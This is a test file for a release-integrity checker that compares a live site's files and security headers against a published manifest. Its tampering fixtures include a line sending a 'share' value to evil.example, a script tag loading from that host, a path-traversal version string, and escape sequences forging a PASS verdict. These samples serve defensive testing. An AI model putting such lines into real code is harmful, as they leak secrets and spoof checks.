import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { createServer, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import { createHash } from 'node:crypto'
// @ts-expect-error - plain .mjs scripts, deliberately not part of the app's TS build
import { verifyWeb, manifestUrl, badSite, fetchManifest, EXIT, MAX_FILE_BYTES } from '../../scripts/web-verify.mjs'
// @ts-expect-error - plain .mjs script
import { buildManifest, serializeManifest } from '../../scripts/web-manifest.mjs'

// #605: verify-web against a site served here, so every verdict is checked against real HTTP.
const COMMIT = '0123456789abcdef0123456789abcdef01234567'
const HEADERS = { 'X-Frame-Options': 'DENY', 'Content-Security-Policy': "default-src 'self'" }
const sha = (b: string) => createHash('sha256').update(b).digest('hex')

type Site = { files: Record<string, string>; headers: Record<string, string>; redirect?: string; root?: string }
let site: Site
let server: Server
let origin: string

const fresh = (): Site => ({
  files: {
    'index.html': '<!doctype html><script src="./assets/index-AAAAAAAA.js"></script>',
    'assets/index-AAAAAAAA.js': 'console.log(1)',
    'version.json': JSON.stringify({ version: '0.22.0', commit: COMMIT.slice(0, 7) }),
  },
  headers: { ...HEADERS },
})

const manifestOf = (s: Site, over: Partial<{ version: string; commit: string }> = {}) => serializeManifest(buildManifest({
  version: over.version ?? '0.22.0',
  commit: over.commit ?? COMMIT,
  env: { VITE_RELAY_BASE: 'https://relay.konclave.xyz' },
  headers: HEADERS,
  files: Object.entries(s.files).map(([path, body]) => ({ path, sha256: sha(body), size: Buffer.byteLength(body) })),
}))

beforeAll(async () => {
  server = createServer((req, res) => {
    const path = decodeURIComponent((req.url ?? '/').split('?')[0] ?? '').replace(/^\//, '') || 'index.html'
    if (site.redirect && path === site.redirect) { res.writeHead(308, { Location: 'https://elsewhere.example/' }); res.end(); return }
    const body = (req.url === '/' && site.root !== undefined) ? site.root : site.files[path]
    if (body === undefined) { res.writeHead(404); res.end(); return }
    res.writeHead(200, site.headers)
    res.end(body)
  })
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r))
  origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
})
afterAll(() => new Promise<void>((r) => server.close(() => r())))

const run = async (opts: Record<string, unknown> = {}) => {
  const r = await verifyWeb({ site: origin, ...opts })
  return { code: r.code as number, out: (r.lines as string[]).join('\n') }
}
const withManifest = (text: string) => ({ manifest: { bytes: new TextEncoder().encode(text), from: 'test' } })

describe('verify-web (#605)', () => {
  it('passes a site that serves exactly the release, files and headers', async () => {
    site = fresh()
    const { code, out } = await run(withManifest(manifestOf(site)))
    expect(out).toMatch(/PASS assets\/index-AAAAAAAA\.js/)
    expect(out).toMatch(/PASS \/ \(index\.html\)/)
    expect(out).toMatch(/PASS header Content-Security-Policy/)
    expect(out).toMatch(/does not stop a compromised server/)
    expect(code).toBe(EXIT.PASS)
  })

  it('names a file whose bytes changed', async () => {
    site = fresh()
    const m = manifestOf(site)
    site.files['assets/index-AAAAAAAA.js'] = 'fetch("https://evil.example/" + share)'
    const { code, out } = await run(withManifest(m))
    expect(out).toMatch(/FAIL assets\/index-AAAAAAAA\.js \(expected [0-9a-f]{64}, got [0-9a-f]{64}\)/)
    expect(code).toBe(EXIT.FAIL)
  })

  it('fails a missing file and a redirect, which it never follows', async () => {
    site = fresh()
    const m = manifestOf(site)
    delete site.files['assets/index-AAAAAAAA.js']
    expect((await run(withManifest(m))).out).toMatch(/FAIL assets\/index-AAAAAAAA\.js \(HTTP 404\)/)
    site = fresh()
    site.redirect = 'assets/index-AAAAAAAA.js'
    const r = await run(withManifest(manifestOf(fresh())))
    expect(r.out).toMatch(/FAIL assets\/index-AAAAAAAA\.js \(HTTP 308\)/)
    expect(r.code).toBe(EXIT.FAIL)
  })

  it('fails a loosened security header', async () => {
    site = fresh()
    const m = manifestOf(site)
    site.headers['Content-Security-Policy'] = "default-src *"
    const { code, out } = await run(withManifest(m))
    expect(out).toMatch(/FAIL header Content-Security-Policy \(expected "default-src 'self'", got "default-src \*"\)/)
    // Files and headers are counted apart: every file matched, one header did not.
    expect(out).toMatch(/FAIL: 4 of 4 files matched \(\/ included\), 0 failed, 0 could not be fetched; 1 of 2 headers matched\./)
    expect(code).toBe(EXIT.FAIL)
  })

  it('says NOT A RELEASE when the site serves another commit under the same version', async () => {
    site = fresh()
    const { code, out } = await run(withManifest(manifestOf(site, { commit: 'f'.repeat(40) })))
    expect(out).toMatch(/NOT A RELEASE/)
    expect(out).not.toMatch(/PASS assets/)
    // An early answer still ends with what to do and what the check does not cover.
    expect(out).toMatch(/On a FAIL: do not unlock a vault/)
    expect(out).toMatch(/does not stop a compromised server/)
    expect(code).toBe(EXIT.FAIL)
  })

  it('refuses a site older than the version expected, and a manifest of another version', async () => {
    site = fresh()
    expect((await run({ ...withManifest(manifestOf(site)), expectVersion: '0.23.0' })).out).toMatch(/serves 0\.22\.0, expected 0\.23\.0/)
    const r = await run(withManifest(manifestOf(site, { version: '0.21.0' })))
    expect(r.out).toMatch(/the site says 0\.22\.0, the manifest is of 0\.21\.0/)
    expect(r.code).toBe(EXIT.FAIL)
  })

  it('is inconclusive on a server error, which says nothing about the bytes', async () => {
    site = fresh()
    const m = manifestOf(site)
    const fetchFn = (url: string, init: RequestInit) =>
      url.endsWith('/assets/index-AAAAAAAA.js') ? Promise.resolve(new Response('busy', { status: 503 })) : fetch(url, init)
    const r = await run({ ...withManifest(m), fetchFn })
    expect(r.out).toMatch(/INCONCLUSIVE assets\/index-AAAAAAAA\.js \(HTTP 503\)/)
    expect(r.code).toBe(EXIT.INCONCLUSIVE)
  })

  it('stops reading a body at the size cap, even with no length announced', async () => {
    site = fresh()
    const m = manifestOf(site)
    let pulled = 0
    const chunk = new Uint8Array(1024 * 1024)
    const endless = () => new Response(new ReadableStream({ pull(c) { pulled++; c.enqueue(chunk) } }), { status: 200 })
    const fetchFn = (url: string, init: RequestInit) =>
      url.endsWith('/assets/index-AAAAAAAA.js') ? Promise.resolve(endless()) : fetch(url, init)
    const r = await run({ ...withManifest(m), fetchFn })
    expect(r.out).toMatch(/FAIL assets\/index-AAAAAAAA\.js \(larger than \d+ bytes\)/)
    expect(pulled).toBeLessThan(MAX_FILE_BYTES / chunk.length + 4)
    expect(r.code).toBe(EXIT.FAIL)
  })

  it('is inconclusive when version.json itself is a server error', async () => {
    const fetchFn = (url: string, init: RequestInit) =>
      url.endsWith('/version.json') ? Promise.resolve(new Response('down', { status: 502 })) : fetch(url, init)
    const r = await run({ ...withManifest(manifestOf(fresh())), fetchFn })
    expect(r.out).toMatch(/INCONCLUSIVE version\.json \(HTTP 502\)/)
    expect(r.out).not.toMatch(/do not unlock/)
    expect(r.code).toBe(EXIT.INCONCLUSIVE)
  })

  it('says when the headers were not checked', async () => {
    site = fresh()
    const m = manifestOf(site)
    site.files['index.html'] = 'changed'
    const r = await run(withManifest(m))
    expect(r.out).toMatch(/headers not checked \(\/ did not pass\)/)
  })

  it('shows what the site sent escaped, so it cannot rewrite the verdict line', async () => {
    site = fresh()
    site.files['version.json'] = JSON.stringify({ version: '0.22.0', commit: '\u001b[2K\rPASS' })
    const r = await run(withManifest(manifestOf(site)))
    expect(r.out).not.toMatch(/\u001b/)
    expect(r.out).toMatch(/\\u001b\[2K\\u000dPASS/)
    site.files['version.json'] = JSON.stringify({ version: '0.22.0', commit: 'abc\u202eSSAP' })
    expect((await run(withManifest(manifestOf(site)))).out).toMatch(/abc\\u202eSSAP/)
  })

  it('reports files in the manifest order, whatever order they arrive in', async () => {
    site = fresh()
    for (let i = 0; i < 20; i++) site.files[`assets/f${String(i).padStart(2, '0')}.js`] = `x${i}`
    const m = manifestOf(site)
    const slow = (url: string, init: RequestInit) => new Promise<Response>((res) => setTimeout(() => res(fetch(url, init)), Math.random() * 20))
    const a = (await run({ ...withManifest(m), fetchFn: slow })).out
    const b = (await run({ ...withManifest(m), fetchFn: slow })).out
    expect(a).toBe(b)
  })

  it('fetches a manifest URL with the same limits, https only', async () => {
    expect((await fetchManifest('http://example.com/m.json')).code).toBe(EXIT.USAGE)
    const ok = await fetchManifest('HTTPS://example.invalid/m.json', () => Promise.resolve(new Response('x', { status: 200 })))
    expect(ok.bytes).toBeInstanceOf(Uint8Array)
    const r = await fetchManifest('https://example.invalid/m.json', () => Promise.resolve(new Response(null, { status: 404 })))
    expect(r.code).toBe(EXIT.INCONCLUSIVE)
  })

  it('fails a security header that is missing, not only one that changed', async () => {
    site = fresh()
    const m = manifestOf(site)
    delete site.headers['X-Frame-Options']
    const r = await run(withManifest(m))
    expect(r.out).toMatch(/FAIL header X-Frame-Options \(expected "DENY", got none\)/)
    expect(r.code).toBe(EXIT.FAIL)
  })

  it('compares / itself, not only /index.html', async () => {
    site = fresh()
    const m = manifestOf(site)
    site.root = '<!doctype html><script src="https://evil.example/x.js"></script>'
    const r = await run(withManifest(m))
    expect(r.out).toMatch(/PASS index\.html/)
    expect(r.out).toMatch(/FAIL \/ \(index\.html\)/)
    expect(r.code).toBe(EXIT.FAIL)
  })

  it('fails a manifest that lists no index.html', async () => {
    site = fresh()
    const noIndex = { ...site, files: { ...site.files } }
    delete noIndex.files['index.html']
    const r = await run(withManifest(manifestOf(noIndex)))
    expect(r.out).toMatch(/FAIL the manifest lists no index\.html/)
    expect(r.code).toBe(EXIT.FAIL)
  })

  it('follows the release download redirect for the manifest, and only for it', async () => {
    site = fresh()
    const text = manifestOf(site)
    const modes: Record<string, string | undefined> = {}
    const fetchFn = (url: string, init: RequestInit) => {
      modes[url.startsWith('https://github.com/') ? 'manifest' : 'site'] = init.redirect
      return url.startsWith('https://github.com/') ? Promise.resolve(new Response(text, { status: 200 })) : fetch(url, init)
    }
    const r = await run({ fetchFn })
    expect(modes).toEqual({ manifest: 'follow', site: 'manual' })
    expect(r.code).toBe(EXIT.PASS)
  })

  it('treats a malformed manifest as a usage error, not a verdict', async () => {
    site = fresh()
    const m = manifestOf(site)
    const r = await run(withManifest(m.replace(/\n$/, '')))
    expect(r.out).toMatch(/USAGE web manifest: not in canonical form/)
    expect(r.code).toBe(EXIT.USAGE)
  })

  it('is inconclusive when the site does not answer, or the release has no manifest yet', async () => {
    const closed = await run({ site: 'http://127.0.0.1:1', ...withManifest(manifestOf(fresh())) })
    expect(closed.code).toBe(EXIT.INCONCLUSIVE)
    site = fresh()
    const seen: string[] = []
    const fetchFn = (url: string, init: RequestInit) => {
      seen.push(url)
      return url.startsWith('https://github.com/') ? Promise.resolve(new Response(null, { status: 404 })) : fetch(url, init)
    }
    const r = await run({ fetchFn })
    expect(seen).toContain('https://github.com/deegalabs/konclave/releases/download/v0.22.0/web-manifest.json')
    expect(r.out).toMatch(/INCONCLUSIVE no published manifest for v0\.22\.0/)
    expect(r.code).toBe(EXIT.INCONCLUSIVE)
  })

  it('never builds a manifest URL from a version it has not validated', async () => {
    site = fresh()
    site.files['version.json'] = JSON.stringify({ version: '0.21.0/../../../../attacker/repo/releases/download/v1', commit: 'x' })
    const seen: string[] = []
    const r = await run({ fetchFn: (url: string, init: RequestInit) => { seen.push(url); return fetch(url, init) } })
    expect(r.out).toMatch(/FAIL version\.json names no release version/)
    expect(seen.some((u) => u.includes('attacker'))).toBe(false)
    expect(() => manifestUrl('0.21.0/../x')).toThrow()
    expect(manifestUrl('0.21.0')).toBe('https://github.com/deegalabs/konclave/releases/download/v0.21.0/web-manifest.json')
  })

  it('checks https origins only, plain http on the loopback alone', () => {
    expect(badSite('https://www.konclave.xyz')).toBeNull()
    expect(badSite('http://127.0.0.1:8080')).toBeNull()
    expect(badSite('http://www.konclave.xyz')).toMatch(/https only/)
    expect(badSite('https://www.konclave.xyz/')).toMatch(/origin/)
    expect(badSite('nope')).toMatch(/not a URL/)
  })
})
